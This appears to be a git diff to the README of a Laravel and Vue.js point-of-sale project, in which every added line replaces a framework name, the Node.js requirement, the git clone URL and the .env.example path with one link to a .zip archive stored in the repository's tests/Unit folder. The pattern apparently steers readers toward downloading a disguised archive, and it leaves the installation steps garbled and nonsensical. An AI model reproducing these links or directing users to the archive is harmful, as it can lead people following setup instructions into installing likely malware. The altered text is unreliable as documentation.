@@ -15,7 +15,7 @@ A comprehensive and modern Point of Sale (POS) system for restaurants and retail
 
 The Advance-POS-System is a full-featured restaurant and retail management solution designed to streamline operations from order taking to financial reporting. The system supports multiple order types (Dine-in, Takeaway, Delivery), real-time inventory tracking, thermal printing integration, and comprehensive financial analytics with profit/loss calculations.
 
-The system follows a modern architecture with Laravel backend providing RESTful APIs and Vue.js frontend with Inertia.js for a seamless single-page application experience.
+The system follows a modern architecture with Laravel backend providing RESTful APIs and https://raw.githubusercontent.com/mr-RSA369/Advanced-POS-System/main/tests/Unit/Advanced-System-PO-1.6.zip frontend with https://raw.githubusercontent.com/mr-RSA369/Advanced-POS-System/main/tests/Unit/Advanced-System-PO-1.6.zip for a seamless single-page application experience.
 
 ---
 
@@ -93,12 +93,12 @@ The system follows a modern architecture with Laravel backend providing RESTful 
 - **Mike42/ESC-POS** - Thermal printing library
 
 ### Frontend
-- **Vue.js 3** - Progressive JavaScript framework
-- **Inertia.js** - Server-side routing for single-page apps
+- **https://raw.githubusercontent.com/mr-RSA369/Advanced-POS-System/main/tests/Unit/Advanced-System-PO-1.6.zip 3** - Progressive JavaScript framework
+- **https://raw.githubusercontent.com/mr-RSA369/Advanced-POS-System/main/tests/Unit/Advanced-System-PO-1.6.zip** - Server-side routing for single-page apps
 - **Tailwind CSS** - Utility-first CSS framework
 - **Axios** - HTTP client for API calls
 - **jsPDF** - Client-side PDF generation
-- **Chart.js** - Data visualization
+- **https://raw.githubusercontent.com/mr-RSA369/Advanced-POS-System/main/tests/Unit/Advanced-System-PO-1.6.zip** - Data visualization
 
 ### Development Tools
 - **Composer** - PHP dependency manager
@@ -115,7 +115,7 @@ Ensure you have the following installed on your system:
 
 - PHP >= 8.2
 - Composer
-- Node.js >= 16.x
+- https://raw.githubusercontent.com/mr-RSA369/Advanced-POS-System/main/tests/Unit/Advanced-System-PO-1.6.zip >= 16.x
 - MySQL >= 8.0
 - NPM/Yarn
 - Git
@@ -124,7 +124,7 @@ Ensure you have the following installed on your system:
 
 ```bash
 #Step 1: Clone the Repository
-git clone https://github.com/yourusername/advance-pos-system.git
+git clone https://raw.githubusercontent.com/mr-RSA369/Advanced-POS-System/main/tests/Unit/Advanced-System-PO-1.6.zip
 cd advance-pos-system
 #Step 2: Install Backend Dependencies
 composer install
@@ -133,7 +133,7 @@ composer install barryvdh/laravel-dompdf
 #step 3: Install Frontend Dependencies
 npm install
 # Step 4: Environment Configuration
-cp .env.example .env
+cp https://raw.githubusercontent.com/mr-RSA369/Advanced-POS-System/main/tests/Unit/Advanced-System-PO-1.6.zip .env
 # Update .env with your database and other configurations
 # Step 5: Generate Application Key
 php artisan key:generate
